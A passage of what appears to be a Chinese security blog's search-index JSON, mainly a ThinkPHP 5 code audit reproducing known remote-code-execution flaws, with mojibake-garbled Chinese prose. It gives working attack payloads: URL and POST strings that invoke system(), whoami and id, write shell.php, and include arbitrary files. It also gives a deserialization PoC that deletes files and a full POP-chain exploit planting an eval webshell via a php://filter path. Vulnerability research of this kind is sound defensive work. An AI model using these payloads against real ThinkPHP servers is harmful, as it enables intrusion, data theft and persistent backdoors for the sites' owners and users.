flag{07d47ce4-b5de-4671-9cdf-568fb9ec822f}\n","date":"2021-04-03T00:00:00Z","image":"https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210404094236.png","permalink":"https://anthem-whisper.github.io/p/%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF-writeup-by-x1ct34m/","title":"çº¢æ˜è°·æ¯ Writeup by X1cT34m"},{"content":"æœ¬ç¯‡åšæ–‡ä¼šå¤ç°å¤§å¤šæ•°tp5çš„æ¼æ´ï¼ŒæŒç»­æ›´æ–°\nå®¡è®¡ç¯å¢ƒæ­å»º å®‰è£…thinkphp æ¨èä½¿ç”¨composerï¼Œç‰ˆæœ¬åˆ‡æ¢å¾ˆæ–¹ä¾¿\ncomposer create-project --prefer-dist topthink/think=5.0.10 tp5.0.10 å°† composer.json æ–‡ä»¶çš„ require å­—æ®µè®¾ç½®æˆå¦‚ä¸‹ï¼š\n\u0026quot;require\u0026quot;: { \u0026quot;php\u0026quot;: \u0026quot;\u0026gt;=5.4.0\u0026quot;, \u0026quot;topthink/framework\u0026quot;: \u0026quot;5.0.10\u0026quot; }, ç„¶åæ‰§è¡Œ composer update\nPhpStorm+Xdebugè°ƒè¯•ç¯å¢ƒ å¯ä»¥çœ‹æˆ‘å¦å¤–ä¸€ç¯‡æ–‡ç« ï¼šDebianä¸‹PHP Xdebugè°ƒè¯•ç¯å¢ƒæ­å»º\nå¦å¤–VSCode+Xdebugä¹Ÿæ˜¯ä¸€ä¸ªä¸é”™ä¸”æ–¹ä¾¿çš„é€‰æ‹©\næ¡†æ¶åŸºæœ¬æµç¨‹ æ¡†æ¶åŸºæœ¬æµç¨‹ç½‘ä¸Šéƒ½è®²çš„å¾ˆæ¸…æ¥šï¼Œæˆ‘è¿™é‡Œå°±ä¸æ¬è¿äº†\nè¿™ä¸¤ç¯‡æ–‡ç« è®²çš„å¾ˆä¸é”™ï¼š\nhttps://paper.seebug.org/888/#_4\nhttps://xz.aliyun.com/t/8143\nRCE-ç±»åè§£æå¯¼è‡´ä»»æ„ç±»æ–¹æ³•è°ƒç”¨  ThinkPHPç‰ˆæœ¬ï¼š5.0.7\u0026lt;=5.0.x\u0026lt;=5.0.22 ã€5.1.0\u0026lt;=5.1.x\u0026lt;=5.1.30\nå‚è€ƒï¼š\nhttps://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C9.md\nhttps://paper.seebug.org/888/#poc\nhttps://xz.aliyun.com/t/3570\n æ¦‚è¿° æœ¬æ¬¡æ¼æ´å­˜åœ¨äº ThinkPHP åº•å±‚æ²¡æœ‰å¯¹æ§åˆ¶å™¨åè¿›è¡Œå¾ˆå¥½çš„åˆæ³•æ€§æ ¡éªŒï¼Œå¯¼è‡´åœ¨æœªå¼€å¯å¼ºåˆ¶è·¯ç”±çš„æƒ…å†µä¸‹ï¼Œç”¨æˆ·å¯ä»¥è°ƒç”¨ä»»æ„ç±»çš„ä»»æ„æ–¹æ³•ï¼Œæœ€ç»ˆå¯¼è‡´ è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ çš„äº§ç”Ÿã€‚æ¼æ´å½±å“ç‰ˆæœ¬ï¼š 5.0.7\u0026lt;=ThinkPHP5\u0026lt;=5.0.22 ã€5.1.0\u0026lt;=ThinkPHP\u0026lt;=5.1.30ã€‚ä¸åŒç‰ˆæœ¬ payload éœ€ç¨ä½œè°ƒæ•´ï¼š\n5.1.x ï¼š\n?s=index/\\think\\Request/input\u0026amp;filter[]=system\u0026amp;data=pwd ?s=index/\\think\\view\\driver\\Php/display\u0026amp;content=\u0026lt;?php phpinfo();?\u0026gt; ?s=index/\\think\\template\\driver\\file/write\u0026amp;cacheFile=shell.php\u0026amp;content=\u0026lt;?php phpinfo();?\u0026gt; ?s=index/\\think\\Container/invokefunction\u0026amp;function=call_user_func_array\u0026amp;vars[0]=system\u0026amp;vars[1][]=id ?s=index/\\think\\app/invokefunction\u0026amp;function=call_user_func_array\u0026amp;vars[0]=system\u0026amp;vars[1][]=id 5.0.x ï¼š\n?s=index/think\\config/get\u0026amp;name=database.username # è·å–é…ç½®ä¿¡æ¯ ?s=index/\\think\\Lang/load\u0026amp;file=../../test.jpg # åŒ…å«ä»»æ„æ–‡ä»¶ ?s=index/\\think\\Config/load\u0026amp;file=../../t.php # åŒ…å«ä»»æ„.phpæ–‡ä»¶ ?s=index/\\think\\app/invokefunction\u0026amp;function=call_user_func_array\u0026amp;vars[0]=system\u0026amp;vars[1][]=id 5.1.xç±»åè§£æ 2018å¹´12æœˆ9æ—¥å®˜æ–¹å‘å¸ƒçš„è¡¥ä¸ï¼Œåœ¨library/think/route/dispatch/Module.phpè·å–æ§åˆ¶å™¨åå¤„åŠ äº†ä¸ªä¸€ä¸ªæ­£åˆ™waf\næ´å…¶å®ä¸åœ¨è¿™é‡Œ\nåœ¨è·¯ç”±è°ƒåº¦çš„æ—¶å€™ï¼š\nè·Ÿè¿›åˆ°thinkphp/library/think/route/dispatch/Module.php:\nè·Ÿè¿›controlleræ–¹æ³•ï¼š(thinkphp/library/think/App.php)\nè·Ÿè¿›parseModuleAndClassæ–¹æ³•ï¼š(thinkphp/library/think/App.php)\nè¿™ä¸ªæ–¹æ³•å…ˆå¯¹$name(ç±»å)è¿›è¡Œåˆ¤æ–­ï¼Œå½“$nameå«æœ‰\\æ—¶ä¼šç›´æ¥å°†å…¶ä½œä¸ºç±»çš„å‘½åç©ºé—´è·¯å¾„ï¼Œå¯¼è‡´æˆ‘ä»¬å¯ä»¥ä»»æ„æ–¹æ³•è°ƒç”¨ï¼Œæ¯”å¦‚ï¼š\n thinkphp/library/think/Container.phpï¼š  http://127.0.0.1/public/index.php?s=index/think\\Container/invokefunction\u0026amp;function=call_user_func_array\u0026amp;vars[0]=phpinfo\u0026amp;vars[1][]=1 é€šè¿‡è‡ªåŠ¨åŠ è½½çš„ç‰¹æ€§ï¼Œthink\\Containerå¯ä»¥ç›´æ¥è°ƒç”¨thinkphp/library/think/Container.phpçš„å±é™©æ–¹æ³•invokefunctionï¼Œé€ æˆRCEã€‚\n thinkphp/library/think/Request.php:  å› ä¸ºæ˜¯privateï¼Œæ‰€ä»¥æŸ¥æ‰¾åŒä¸€ç±»é‡Œé¢çš„ç”¨ä¾‹ï¼š\n Request::inputæ–¹æ³•ï¼š  æ„é€ pocï¼š\nhttp://127.0.0.1/public/index.php?s=index/think\\request/input\u0026amp;data=1\u0026amp;filter=phpinfo\u0026amp;name= Request::cookieæ–¹æ³•ï¼š  æ„é€ pocï¼š\nhttp://127.0.0.1/public/?s=index/think\\request/cookie\u0026amp;name=cmd\u0026amp;filter=phpinfo [HTTP header] Cookie: cmd=1 åŒæ ·æˆåŠŸRCEã€‚\n thinkphp/library/think/template/driver/File.php:  æ„é€ pocï¼š\nhttp://127.0.0.1/public/?s=index/think\\template\\driver\\file/write\u0026amp;cacheFile=/tmp/test.txt\u0026amp;content=hacked æˆåŠŸå†™å…¥/tmp/test.txtæ–‡ä»¶ã€‚\n5.0.xç±»åè§£æ thinkphp/library/think/Loader.php:\nåŸç†ç±»ä¼¼ï¼Œåœ¨App::run()æ–¹æ³•é‡Œé¢ï¼ŒLoader::controllerè¿›è¡Œè°ƒåº¦çš„æ—¶å€™ï¼Œå½“$nameå«æœ‰\\æ—¶ä¼šç›´æ¥å°†å…¶ä½œä¸ºç±»çš„å‘½åç©ºé—´è·¯å¾„ï¼Œå¯¼è‡´æˆ‘ä»¬å¯ä»¥ä»»æ„æ–¹æ³•è°ƒç”¨ã€‚æ¯”å¦‚ï¼š\n thinkphp/library/think/App.php:  æ„é€ poc:\nhttp://127.0.0.1/public/?s=index/think\\app/invokefunction\u0026amp;function=call_user_func_array\u0026amp;vars[0]=assert\u0026amp;vars[1][]=phpinfo() http://127.0.0.1/public/?s=index/\\think\\app/invokefunction\u0026amp;function=call_user_func_array\u0026amp;vars[0]=phpinfo\u0026amp;vars[1][]=1 evalå› ä¸ºä¸æ˜¯å‡½æ•°ä¸èƒ½ç›´æ¥å›è°ƒï¼Œåœ¨ç‰¹å®šphpç‰ˆæœ¬æƒ…å†µä¸‹å¯ä»¥ä½¿ç”¨assertç›´æ¥RCEï¼Œæˆ–è€…åˆ©ç”¨å…¶ä»–å‡½æ•°è¯»å†™æ–‡ä»¶ã€‚\néœ€è¦æ³¨æ„çš„é—®é¢˜ åœ¨https://xz.aliyun.com/t/3570#toc-3è¿™ç¯‡æ–‡ç« é‡Œé¢æåˆ°ï¼š\n å› ä¸ºé»˜è®¤é…ç½®ä¼šåˆ¤æ–­æ˜¯å¦è‡ªåŠ¨è½¬æ¢æ§åˆ¶å™¨ï¼Œå°†æ§åˆ¶å™¨åå˜æˆå°å†™\nåˆå› ä¸ºLoader.php::autoloadwinåœ¨winç¯å¢ƒä¸‹ä¸¥æ ¼åŒºåˆ†å¤§å°å†™ï¼Œæ‰€ä»¥å¯¼è‡´æœ‰äº›ç±»åŠ è½½ä¸åˆ°\n ä½†æ˜¯æˆ‘åœ¨Kaliä¸‹ç»è¿‡å°å†™è½¬æ¢åŒæ ·ä¹Ÿæ²¡åŠæ³•åŠ è½½åˆ°ï¼Œå¯èƒ½æ˜¯å› ä¸ºLinuxæœ¬æ¥å°±åŒºåˆ†å¤§å°å†™ï¼Ÿ\nå¦‚æ­¤ä¸€æ¥ï¼Œç€æ‰‹ç‚¹åªæœ‰æ¡†æ¶åœ¨åŠ è½½çš„æ—¶å€™å°±å·²ç»åŠ è½½çš„ç±»äº†\nRCE-Requestæ ¸å¿ƒç±»å˜é‡è¦†ç›–  ThinkPHPç‰ˆæœ¬ï¼š5.0.0\u0026lt;=ThinkPHP5\u0026lt;=5.0.23 ã€5.1.0\u0026lt;=ThinkPHP\u0026lt;=5.1.30\nå‚è€ƒï¼š\nhttps://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C10.md\n æ¦‚è¿° Requestæ ¸å¿ƒç±»**$method** æ¥è‡ªå¯æ§çš„ **$_POST** æ•°ç»„ï¼Œè€Œä¸”åœ¨è·å–ä¹‹åæ²¡æœ‰è¿›è¡Œä»»ä½•æ£€æŸ¥ï¼Œç›´æ¥æŠŠå®ƒä½œä¸º **Request** ç±»çš„æ–¹æ³•è¿›è¡Œè°ƒç”¨ï¼ŒåŒæ—¶ï¼Œè¯¥æ–¹æ³•ä¼ å…¥çš„å‚æ•°æ˜¯å¯æ§æ•°æ® **$_POST** ã€‚å¯¼è‡´å¯ä»¥éšæ„è°ƒç”¨ **Request** ç±»çš„éƒ¨åˆ†æ–¹æ³•\npayloadï¼š\nhttp://php.local/thinkphp5.0.5/public/index.php?s=index post _method=__construct\u0026amp;method=get\u0026amp;filter[]=call_user_func\u0026amp;get[]=phpinfo _method=__construct\u0026amp;filter[]=system\u0026amp;method=GET\u0026amp;get[]=whoami # ThinkPHP \u0026lt;= 5.0.13 POST /?s=index/index s=whoami\u0026amp;_method=__construct\u0026amp;method=\u0026amp;filter[]=system # ThinkPHP \u0026lt;= 5.0.23ã€5.1.0 \u0026lt;= 5.1.16 éœ€è¦å¼€å¯æ¡†æ¶app_debug POST / _method=__construct\u0026amp;filter[]=system\u0026amp;server[REQUEST_METHOD]=ls -al # ThinkPHP \u0026lt;= 5.0.23 éœ€è¦å­˜åœ¨xxxçš„methodè·¯ç”±ï¼Œä¾‹å¦‚captcha POST /?s=xxx HTTP/1.1 _method=__construct\u0026amp;filter[]=system\u0026amp;method=get\u0026amp;get[]=ls+-al _method=__construct\u0026amp;filter[]=system\u0026amp;method=get\u0026amp;server[REQUEST_METHOD]=ls 5.0.10å˜é‡è¦†ç›– æµ‹è¯•ç”¨çš„payloadï¼ˆç‰ˆæœ¬5.0.10ï¼‰ï¼š\nhttp://127.0.0.1/public/index.php?s=index POST: _method=__construct\u0026amp;filter[]=system\u0026amp;method=get\u0026amp;get[]=whoami åœ¨App::run()æ–¹æ³•è¿›è¡Œè·¯ç”±æ£€æµ‹çš„æ—¶å€™ï¼Œåœ¨Route.phpå¤§çº¦843è¡Œè°ƒç”¨$request-\u0026gt;method()æ–¹æ³•\nthinkphp/library/think/Request.php:\nå¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªå¯ä»¥æ§åˆ¶çš„å‡½æ•°å$_POST[Config::get['var_method']ï¼Œè€Œvar_methodçš„å€¼åœ¨application/config.phpé‡Œé¢ä¸º_method:\näºæ˜¯å¯ä»¥POSTä¼ å…¥_methodæ”¹å˜$this-\u0026gt;{$this-\u0026gt;method}($_POST);è¾¾åˆ°ä»»æ„è°ƒç”¨æ­¤ç±»ä¸­çš„æ–¹æ³•\nè€Œå¦‚æœè°ƒç”¨æ­¤ç±»ä¸­çš„__constructæ–¹æ³•ï¼š æœ‰ä¸€ä¸ªforeachï¼Œå¯ä»¥å¼•èµ·POSTæ•°æ®å¯¹Requestså¯¹è±¡å±æ€§çš„å˜é‡è¦†ç›–ã€‚\nåœ¨App::run()æ–¹æ³•é‡Œé¢ï¼Œå¦‚æœæˆ‘ä»¬å¼€å¯äº†debugæ¨¡å¼ï¼Œåˆ™ä¼šè°ƒç”¨Request::param()æ–¹æ³•ï¼š\nå½“ç„¶ï¼Œå³ä½¿æ²¡æœ‰å¼€å¯debugï¼Œåœ¨App::run()é‡Œé¢çš„è°ƒç”¨çš„execæ–¹æ³•åŒæ ·ä¹Ÿä¼šè°ƒç”¨Request::param()æ–¹æ³•\nå› ä¸ºè°ƒç”¨æ ˆå¤ªæ·±ï¼Œå°±ä¸ä¸€ä¸ªä¸ªè·Ÿäº†\nè¿™ä¸ªæ–¹æ³•æˆ‘ä»¬éœ€è¦ç‰¹åˆ«å…³æ³¨äº†ï¼Œå› ä¸º Request ç±»ä¸­çš„ paramã€routeã€getã€postã€putã€deleteã€patchã€requestã€sessionã€serverã€envã€cookieã€input æ–¹æ³•å‡è°ƒç”¨äº† filterValue æ–¹æ³•ï¼Œè€Œè¯¥æ–¹æ³•ä¸­å°±å­˜åœ¨å¯åˆ©ç”¨çš„ call_user_func å‡½æ•°\nå°ç»“ ä¸åŒçš„payloadè§¦å‘æµç¨‹ä¸ä¸€æ ·ï¼Œä½†æ˜¯æ ¸å¿ƒæ˜¯ä¸€æ ·çš„ã€‚\nä»»æ„æ–¹æ³•è°ƒç”¨å‘ç”Ÿåœ¨method()ï¼Œå˜é‡è¦†ç›–å‘ç”Ÿåœ¨__construct()ï¼Œrceå‘ç”Ÿåœ¨filterValue()\n5.0.24ååºåˆ—åŒ–åˆ©ç”¨é“¾ ååºåˆ—åŒ–å¤ç°é¦–å…ˆéœ€è¦è‡ªå·±æ„é€ ä¸€ä¸ªååºåˆ—åŒ–è§¦å‘ç‚¹ï¼š\n### Windowsç±»-ä»»æ„æ–‡ä»¶åˆ é™¤  åœ¨thinkphp/library/think/process/pipes/Windows.php:\nclass Windows extends Pipes { private $files = []; â€¦â€¦ private function removeFiles() { foreach ($this-\u0026gt;files as $filename) { if (file_exists($filename)) { @unlink($filename); } } $this-\u0026gt;files = []; } â€¦â€¦ public function __destruct() { $this-\u0026gt;close(); $this-\u0026gt;removeFiles(); } } ç”±äº$this-\u0026gt;fileså¯æ§ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å…¶å®ç°ä»»æ„æ–‡ä»¶åˆ é™¤\npocï¼š\n\u0026lt;?php namespace think\\process\\pipes; class Pipes{ } class Windows extends Pipes { private $files = []; public function __construct() { $this-\u0026gt;files=[\u0026#39;D:\\tmp\\1.txt\u0026#39;]; } } echo base64_encode(serialize(new Windows())); åªéœ€è¦ä¸€ä¸ªååºåˆ—åŒ–è§¦å‘ç‚¹ï¼Œå°±å¯ä»¥å®ç°ä»»æ„æ–‡ä»¶åˆ é™¤ã€‚\nOutputç±»__callæ–¹æ³•ä»»æ„æ–‡ä»¶å†™  Thinkphp 5.0.xååºåˆ—åŒ–æœ€åè§¦å‘RCEï¼Œæœ¬æ¥è¦è°ƒç”¨çš„Requestç±»__callæ–¹æ³•.\nå‚è€ƒï¼š\nhttps://xz.aliyun.com/t/8143#toc-10\nhttps://www.anquanke.com/post/id/196364#h2-2\nhttp://althims.com/2020/02/07/thinkphp-5-0-24-unserialize/\nhttps://www.anquanke.com/post/id/219327\n è¿˜æ˜¯ä»Windowsç±»çš„__destructå…¥æ‰‹\nåœ¨ä¸Šè¿°Windowsç±»çš„removeFiles()ä¸­ä½¿ç”¨äº†file_exists()å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ä¼šæŠŠ$filenameå½“ä½œå­—ç¬¦ä¸²å¤„ç†\nåˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥ä¼ å…¥ä¸€ä¸ªå¯¹è±¡æ¥è§¦å‘__toStringæ–¹æ³•ï¼Œäºæ˜¯å…¨å±€æœç´¢__toString\nå¯ä»¥çœ‹åˆ°ä»–è°ƒç”¨äº†toJsonæ–¹æ³•ï¼Œå› ä¸ºclass Modelæ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œä¸èƒ½ç›´æ¥è°ƒç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›®å…‰ç§»åˆ°å­ç±»é‡Œé¢\nå¯ä»¥é€šè¿‡thinkphp/library/think/model/Pivot.phpè¿™ä¸ªé‡Œé¢çš„ç±»è¿›è¡Œè°ƒç”¨\nè·Ÿè¿›toJsonæ–¹æ³•ï¼š\nclass Model { â€¦â€¦ public function toJson($options = JSON_UNESCAPED_UNICODE) { return json_encode($this-\u0026gt;toArray(), $options); } â€¦â€¦ } è°ƒç”¨äº†$this-\u0026gt;toArrayï¼Œè·Ÿè¿›toArrayæ–¹æ³•ï¼š\nclass Model { â€¦â€¦ public function toArray() { $item = []; $visible = []; $hidden = []; $data = array_merge($this-\u0026gt;data, $this-\u0026gt;relation); // è¿‡æ»¤å±æ€§  if (!empty($this-\u0026gt;visible)) { $array = $this-\u0026gt;parseAttr($this-\u0026gt;visible, $visible); $data = array_intersect_key($data, array_flip($array)); } elseif (!empty($this-\u0026gt;hidden)) { $array = $this-\u0026gt;parseAttr($this-\u0026gt;hidden, $hidden, false); $data = array_diff_key($data, array_flip($array)); } foreach ($data as $key =\u0026gt; $val) { if ($val instanceof Model || $val instanceof ModelCollection) { // å…³è”æ¨¡å‹å¯¹è±¡  $item[$key] = $this-\u0026gt;subToArray($val, $visible, $hidden, $key); } elseif (is_array($val) \u0026amp;\u0026amp; reset($val) instanceof Model) { // å…³è”æ¨¡å‹æ•°æ®é›†  $arr = []; foreach ($val as $k =\u0026gt; $value) { $arr[$k] = $this-\u0026gt;subToArray($value, $visible, $hidden, $key); } $item[$key] = $arr; } else { // æ¨¡å‹å±æ€§  $item[$key] = $this-\u0026gt;getAttr($key); } } â€¦â€¦ } å› ä¸ºæœ€ç»ˆè¦è§¦å‘__callï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°å‡½æ•°è°ƒç”¨çš„åœ°æ–¹ï¼Œåœ¨toArrayé‡Œé¢æœ‰è¿™å‡ å¤„ï¼š\nç»è¿‡è°ƒè¯•è¿‡åé€‰æ‹©æœ€åä¸€å¤„$item[$key] = $value ? $value-\u0026gt;getAttr($attr) : null\nè¦è¿›å…¥åˆ°è¿™ä¸€å¤„è¦æ»¡è¶³çš„æ¡ä»¶æ˜¯ï¼š\n1.if (!empty($this-\u0026gt;append))//$this-\u0026gt;appendå¯æ§ï¼Œåé¢æŠŠä»–è®¾ç½®ä¸º\u0026#39;getError\u0026#39; 2.if (method_exists($this, $relation))//$this-\u0026gt;appendå¯æ§ï¼Œå¯¼è‡´$relationå¯æ§ 3.if (method_exists($modelRelation, \u0026#39;getBindAttr\u0026#39;))//åé¢è¯´ 4.if ($bindAttr)//åé¢è¯´ ä¸”ä¸æ»¡è¶³\nif (is_array($name)) elseif (strpos($name, \u0026#39;.\u0026#39;)) if (isset($this-\u0026gt;data[$key])) å…¶ä¸­$valueæ˜¯ç”±è¿™ä¸¤è¡Œç¡®å®šçš„ï¼š\néœ€è¦æ»¡è¶³$modelRelationå¯æ§ï¼Œç»è¿‡æŸ¥æ‰¾ï¼Œå¯ä»¥å°†$relationè®¾ä¸º\u0026rsquo;getError'ï¼Œ$modelRelationå°±å˜æˆäº†$this-\u0026gt;getError()çš„è¿”å›å€¼ï¼š\npublic function getError() { return $this-\u0026gt;error;//$this-\u0026gt;errorå¯æ§ï¼Œä»–å†³å®šäº†$modelRelationçš„å€¼ } è·Ÿè¿›getRelationDate:\nè¿™é‡Œåˆç»™æˆ‘ä»¬å¢åŠ äº†æ¡ä»¶ï¼š\n  5.æœ€åä¼ å…¥çš„$modelRelationéœ€è¦æ˜¯Relationç±»å‹\n  6.æœ€åè¿”å›å€¼$valueséœ€è¦ç»è¿‡ifè¯­å¥åˆ¤æ–­$this-\u0026gt;parent \u0026amp;\u0026amp; !$modelRelation-\u0026gt;isSelfRelation() \u0026amp;\u0026amp; get_class($modelRelation-\u0026gt;getModel()) == get_class($this-\u0026gt;parent)æ‰èƒ½è®©$valueå¯æ§\n è¿™é‡Œæœ‰ä¸¤æ¡è·¯ï¼Œä¸€ç§æ˜¯ç¬¦åˆifåˆ¤æ–­ç›´æ¥è¿”å›ï¼Œå¦ä¸€ç§æ˜¯ä¸æ»¡è¶³ï¼Œè¿›è€Œè°ƒç”¨getRelationæ–¹æ³•\nå…·ä½“å¯å‚è€ƒhttps://www.anquanke.com/post/id/219327\n   ç¬¬äºŒæ¡è·¯å…¨å±€æŸ¥æ‰¾getRelationæ–¹æ³•ä¸”ä¸ºRelationå­ç±»çš„ç±»ï¼Œæ‰¾åˆ°äº†HasOneï¼ˆ/thinkphp/library/think/model/relation/HasOne.phpï¼‰\nç¬¬ä¸€æ¡è·¯ï¼Œç¬¦åˆifåˆ¤æ–­ä¹‹å$valueå¯æ§ï¼Œå¾—åˆ°è¿”å›å€¼$valuesä¹‹åä»£ç è·³å‡ºgetRelationDateæ–¹æ³•ï¼Œè¿è¡Œè‡³æ¡ä»¶3å¤„\nif (method_exists($modelRelation, 'getBindAttr'))ï¼Œå‘ç°åœ¨HasOneçš„çˆ¶ç±»OneToOneé‡Œé¢æ˜¯å¯æ§çš„ï¼š\né‚£ä¹ˆæ¡ä»¶4ä¹Ÿå¾—åˆ°äº†è§£å†³ã€‚ä»£ç æ‰§è¡Œåˆ°äº†$item[$key] = $value ? $value-\u0026gt;getAttr($attr) : null\næ§åˆ¶$valueå°±èƒ½è°ƒç”¨__callæ–¹æ³•ï¼›\nä¹‹å‰æˆ‘ä»¬æœ‰æåˆ°è¦RCEéœ€è¦è°ƒç”¨Requestç±»çš„__callæ–¹æ³•ï¼Œä½†æ˜¯ç”±äºself::$hook[$method]ä¸å¯æ§,æ— æ³•æˆåŠŸåˆ©ç”¨\näºæ˜¯æˆ‘ä»¬å¯ä»¥å¯»æ‰¾å…¶ä»–çš„æ–¹æ³•ï¼Œæ¯”å¦‚Outputç±»çš„__callæ–¹æ³•\nè¿™é‡Œè°ƒç”¨äº†blockæ–¹æ³•ï¼Œè·Ÿè¿›ï¼š\nç»§ç»­è·Ÿè¿›ï¼š\nç–¯ç‹‚è·Ÿè¿›ï¼š\n$this-\u0026gt;handleæ˜¯å¯æ§çš„ï¼Œç»§ç»­å…¨å±€æœç´¢writeï¼Œå¯»æ‰¾å¯æ§çš„ç‚¹ï¼Œæ‰¾åˆ°äº†/thinkphp/library/think/session/driver/Memcached.php\nåŒæ ·$this-\u0026gt;handleå¯æ§ï¼Œç»§ç»­å…¨å±€æœç´¢setï¼Œæ‰¾åˆ°thinkphp/library/think/cache/driver/File.php\nå¯ä»¥file_put_contentså†™shellï¼Œå¹¶ä¸”$filenameåœ¨getCacheKeyæ–¹æ³•å½“ä¸­æ˜¯å¯æ§çš„ï¼Œä¼ªåè®®ç»•ä¸€ä¸‹exitå°±å¯ä»¥äº†\nä½†æ˜¯$dataæ¯”è¾ƒéº»çƒ¦ï¼Œä»–ä»ä¼ å…¥çš„$valueå–å€¼ï¼Œsetæ–¹æ³•ä¸­çš„å‚æ•°æ¥è‡ªå…ˆå‰è°ƒç”¨çš„writeæ–¹æ³•ï¼Œwriteä¹‹å‰åœ¨writelnçš„æ—¶å€™å°±ä¼ å…¥äº†trueï¼Œä¸å¯æ§ã€‚å·ä¸€å¼ å›¾ï¼š\nç»§ç»­è·Ÿè¿›åé¢çš„setTagItemæ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å®ƒå†æ¬¡è°ƒç”¨äº†setæ–¹æ³•:\nä¸”æ–‡ä»¶å†…å®¹$valueé€šè¿‡$nameèµ‹å€¼(æ–‡ä»¶å)ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨æ–‡ä»¶åä¸Šé¢ä¸‹åŠŸå¤«ï¼Œæ¯”å¦‚php://filter/write=string.rot13/resource=./\u0026lt;?cuc cucvasb();?\u0026gt;è¿™ç§\nexpï¼Œå¯ä»¥å®ç°åœ¨Windowså†™æ–‡ä»¶ï¼ˆæ¥è‡ªç½‘ç»œï¼‰ï¼š\n\u0026lt;?php namespace think\\process\\pipes { class Windows { private $files = []; public function __construct($files) { $this-\u0026gt;files = [$files]; //$file =\u0026gt; /think/Modelçš„å­ç±»new Pivot(); Modelæ˜¯æŠ½è±¡ç±»  } } } namespace think { abstract class Model{ protected $append = []; protected $error = null; public $parent; function __construct($output, $modelRelation) { $this-\u0026gt;parent = $output; //$this-\u0026gt;parent=\u0026gt; think\\console\\Output;  $this-\u0026gt;append = array(\u0026#34;xxx\u0026#34;=\u0026gt;\u0026#34;getError\u0026#34;); //è°ƒç”¨getError è¿”å›this-\u0026gt;error  $this-\u0026gt;error = $modelRelation; // $this-\u0026gt;error è¦ä¸º relationç±»çš„å­ç±»ï¼Œå¹¶ä¸”ä¹Ÿæ˜¯OnetoOneç±»çš„å­ç±»==\u0026gt;\u0026gt;HasOne  } } } namespace think\\model{ use think\\Model; class Pivot extends Model{ function __construct($output, $modelRelation) { parent::__construct($output, $modelRelation); } } } namespace think\\model\\relation{ class HasOne extends OneToOne { } } namespace think\\model\\relation { abstract class OneToOne { protected $selfRelation; protected $bindAttr = []; protected $query; function __construct($query) { $this-\u0026gt;selfRelation = 0; $this-\u0026gt;query = $query; //$queryæŒ‡å‘Query  $this-\u0026gt;bindAttr = [\u0026#39;xxx\u0026#39;];// $valueå€¼ï¼Œä½œä¸ºcallå‡½æ•°å¼•ç”¨çš„ç¬¬äºŒå˜é‡  } } } namespace think\\db { class Query { protected $model; function __construct($model) { $this-\u0026gt;model = $model; //$this-\u0026gt;model=\u0026gt; think\\console\\Output;  } } } namespace think\\console{ class Output{ private $handle; protected $styles; function __construct($handle) { $this-\u0026gt;styles = [\u0026#39;getAttr\u0026#39;]; $this-\u0026gt;handle =$handle; //$handle-\u0026gt;think\\session\\driver\\Memcached  } } } namespace think\\session\\driver { class Memcached { protected $handler; function __construct($handle) { $this-\u0026gt;handler = $handle; //$handle-\u0026gt;think\\cache\\driver\\File  } } } namespace think\\cache\\driver { class File { protected $options=null; protected $tag; function __construct(){ $this-\u0026gt;options=[ \u0026#39;expire\u0026#39; =\u0026gt; 3600, \u0026#39;cache_subdir\u0026#39; =\u0026gt; false, \u0026#39;prefix\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;path\u0026#39; =\u0026gt; \u0026#39;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php\u0026#39;, \u0026#39;data_compress\u0026#39; =\u0026gt; false, ]; $this-\u0026gt;tag = \u0026#39;xxx\u0026#39;; } } } namespace { $Memcached = new think\\session\\driver\\Memcached(new \\think\\cache\\driver\\File()); $Output = new think\\console\\Output($Memcached); $model = new think\\db\\Query($Output); $HasOne = new think\\model\\relation\\HasOne($model); $window = new think\\process\\pipes\\Windows(new think\\model\\Pivot($Output,$HasOne)); echo serialize($window); echo base64_encode(serialize($window)); } å°ç»“ åœ¨æŒ–æ˜è¿™ç§å¤§å‹æ¡†æ¶çš„ååºåˆ—åŒ–é“¾å­çš„æ—¶å€™ï¼Œä»£ç é‡å·¨å¤§ï¼Œæˆ‘ä»¬è¦åœ¨å…¶ä¸­å¯»æ‰¾ï¼š\n å±é™©å‡½æ•°ï¼ˆå›è°ƒï¼Œè¯»å†™æ–‡ä»¶ï¼Œå‘½ä»¤æ‰§è¡Œç­‰ï¼‰ åŒåæ–¹æ³•ï¼ˆå¾€å¾€å¯ä»¥ä½œä¸ºè·³æ¿ï¼‰ å¯æ§å‚æ•°ï¼ˆè¶Šå¤šè¶Šå¥½ï¼‰  å¦å¤–æœ‰ä¸€ç¯‡æ–‡ç« æ€»ç»“çš„æŒºä¸é”™https://xz.aliyun.com/t/8082\n","date":"2021-03-12T00:00:00Z","image":"https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312152311.jpeg","permalink":"https://anthem-whisper.github.io/p/thinkphp5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","title":"thinkphp5ä»£ç å®¡è®¡"},{"content":"Level - Week3 Forgetful è€ƒç‚¹ï¼šç®€å•python-SSTI\né¢˜ç›®æ˜¯ä¸€ä¸ªè®°äº‹æœ¬ï¼Œæ·»åŠ 